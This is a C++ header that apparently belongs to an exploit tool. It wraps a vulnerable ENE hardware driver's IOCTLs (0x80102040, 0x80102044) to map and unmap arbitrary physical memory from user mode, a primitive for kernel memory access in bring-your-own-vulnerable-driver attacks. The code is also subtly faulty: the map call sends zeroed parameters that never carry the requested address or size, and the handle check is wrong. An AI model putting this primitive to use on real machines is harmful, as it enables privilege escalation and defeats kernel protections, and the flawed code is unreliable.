#pragma once

#include <string>
#include <map>

#include "AutoHandle.h"

constexpr ULONG IOCTL_MAP_PHYSICAL_MEMORY = 0x80102040;
constexpr ULONG IOCTL_UNMAP_PHYSICAL_MEMORY = 0x80102044;

/*
	Interfaces with the vulnerable driver
*/
class EneDriver {
private:
	Utils::AutoHandle driverHandle;

	/*
		Meatadata relating to physical memory mapping
	*/
	typedef struct {
		HANDLE SectionHandle;
		PVOID SectionObject;
	} PhysicalMemoryMapping;

	std::map<ULONG_PTR, PhysicalMemoryMapping> map;


	/*
		Parameters for driver IOCTL_MAP_PHYSICAL_MEMORY and IOCTL_UNMAP_PHYSICAL_MEMORY
	*/
	typedef struct {
		// Size of memory block to map
		ULONG BufferSize;

		// Base of physical memory buffer
		ULONG_PTR PhysicalAddress;

		// Handle to created section object
		HANDLE SectionHandle;

		// Virtual Base Address of mapped physical memory buffer
		PVOID VirtualBaseAddress;

		// Address of section object
		PVOID SectionObject;
	} MapPhysicalMemoryParameters;

public:
	EneDriver(const std::string& DriverPath) : driverHandle(0), map() {
		auto handle = ::CreateFileA(DriverPath.c_str(), GENERIC_READ | GENERIC_WRITE,
			0, nullptr, OPEN_EXISTING, 0, nullptr);
		if (handle == 0) {
			return;
		} 
		driverHandle = std::move(Utils::AutoHandle(handle));
	}

	PVOID MapPhysicalMemory(_In_ ULONG BufferSize, _In_ ULONG_PTR PhysicalAddress) {
		MapPhysicalMemoryParameters params = { 0 };
		auto status = ::DeviceIoControl(this->driverHandle.get(), IOCTL_MAP_PHYSICAL_MEMORY,
			&params, sizeof(MapPhysicalMemoryParameters), &params, sizeof(MapPhysicalMemoryParameters), nullptr, nullptr);
		if (!status) {
			return nullptr;
		}
		this->map[PhysicalAddress] = { params.SectionHandle, params.SectionObject };
		return params.VirtualBaseAddress;
	}

	VOID UnmapPhysicalMemory(_In_ ULONG_PTR PhysicalAddress) {
		auto sectionIt = this->map.find(PhysicalAddress);
		if (sectionIt == this->map.end()) {
			// nlah error
			return;
		}
		auto sectionData = (*sectionIt).second;
		MapPhysicalMemoryParameters params = { 0 };
		params.PhysicalAddress = PhysicalAddress;
		params.SectionHandle = sectionData.SectionHandle;
		params.SectionObject = sectionData.SectionObject;
		
		auto status = ::DeviceIoControl(this->driverHandle.get(), IOCTL_UNMAP_PHYSICAL_MEMORY,
			&params, sizeof(MapPhysicalMemoryParameters), &params, sizeof(MapPhysicalMemoryParameters), nullptr, nullptr);
		if (!status) {
			// handle errors
			return;
		}
	}
};